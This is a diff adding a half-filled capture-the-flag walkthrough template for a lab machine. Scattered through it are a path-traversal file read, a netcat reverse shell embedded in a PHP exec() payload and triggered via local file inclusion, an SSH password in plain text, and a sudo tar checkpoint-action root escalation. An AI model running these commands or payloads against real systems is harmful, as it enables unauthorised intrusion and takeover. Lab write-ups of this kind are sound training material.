@@ -1,0 +1,159 @@
+ CTF Walkthrough
+
+## Machine Details
+- **Target IP:** 10.10.10.X
+- **Difficulty:** [Easy/Medium/Hard]
+- **Technologies:** [List relevant technologies]
+
+## 1. Setup Instructions
+- Prepare virtual machine
+- Configure network settings
+- Ensure necessary tools are installed
+
+## 2. Reconnaissance (Recon)
+
+### Network Scanning
+```bash
+# Discover network hosts
+netdiscover -r 10.10.10.0/24
+
+# Comprehensive port scanning
+nmap -sV -v -Pn 10.10.10.X
+nmap -sC -A -v -p- 10.10.10.X
+```
+
+### Scan Results
+```
+PORT    STATE SERVICE VERSION
+22/tcp  open  service Details
+80/tcp  open  service Details
+```
+
+## 3. Enumeration
+- Identify services
+- Look for potential vulnerabilities
+- Check configuration files
+- Explore web applications
+
+http://10.10.10.32/view.php?page=tools.html
+
+http://10.10.10.32/view.php?page=../../../../../../../../../../../../etc/passwd
+
+dirb http://10.10.10.32/ -d /usr/share/wordlists/common.txt 
+
+http://10.10.10.32/dbadmin/
+
+
+## 4. Vulnerability Identification
+
+### Vulnerability Discovery
+- **Vulnerable Version:** 
+- **Exploit Source:** 
+
+### Vulnerability Details
+⚠️ **Vulnerability Name**
+- Detailed vulnerability description
+- Potential impact
+
+### Exploit Preparation
+```bash
+# Exploit execution commands
+```
+
+
+
+mkfifo /tmp/djambb; nc 10.10.10.4 443 0</tmp/djambb | /bin/sh >/tmp/djambb 2>&1; rm /tmp/djambb
+
+
+<?php exec("mkfifo /tmp/djambb; nc 10.10.10.4 443 0</tmp/djambb | /bin/sh >/tmp/djambb 2>&1; rm /tmp/djambb"); ?>
+
+http://10.10.10.32/view.php?page=../../../../../../../../../../../../usr/databases/mq24.php
+
+nc -nlvp 443
+
+
+### Important Exploitation Notes
+- Specific challenges
+- Potential modification requirements
+- Compatibility considerations
+
+## 5. Exploitation Techniques
+
+### Primary Exploitation Method
+```bash
+# Exploitation code/commands
+```
+
+python -c "import pty; pty.spawn('/bin/bash')"
+
+
+cd /home/zico
+
+ssh zico@10.10.10.24
+sWfCsfJSPV9H3AmQzw8
+
+
+
+### Exploitation Steps
+1. Step-by-step exploitation process
+2. Detailed commands
+3. Potential variations
+
+## 6. Privilege Escalation
+
+
+### Privilege Escalation Techniques
+```bash
+# Privilege escalation commands
+
+```
+zico@zico:~$ sudo -l
+Matching Defaults entries for zico on this host:
+    env_reset, exempt_group=admin, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User zico may run the following commands on this host:
+    (root) NOPASSWD: /bin/tar
+    (root) NOPASSWD: /usr/bin/zip
+zico@zico:~$ 
+
+
+tmp$ touch file               
+zico@zico:/tmp$ sudo /bin/tar -c -f /tmp/file.zip . --checkpoint=1 --checkpoint-action=exec='sudo su'
+
+
+## 7. Post-Exploitation
+- Maintain system access
+- Collect additional information
+- Identify further exploitation paths
+
+## 8. Flag Collection
+```bash
+# Typical flag locations
+cd /root
+cat *flag*.txt
+```
+
+## 9. Conclusion
+- Summarize exploitation technique
+- Document lessons learned
+- Note effective tools and methods
+
+## 10. Recommendations
+- Security improvements
+- Patch recommendations
+- Best practices
+
+## Appendix: Potential Challenges
+- Specific technical challenges
+- Debugging tips
+- Potential roadblocks
+
+### References
+- [Relevant Security Resources]
+- [Exploit Details]
+
+## Author's Notes
+🔍 **Debugging Tips:**
+- Key insights
+- Personal observations
+- Lessons learned
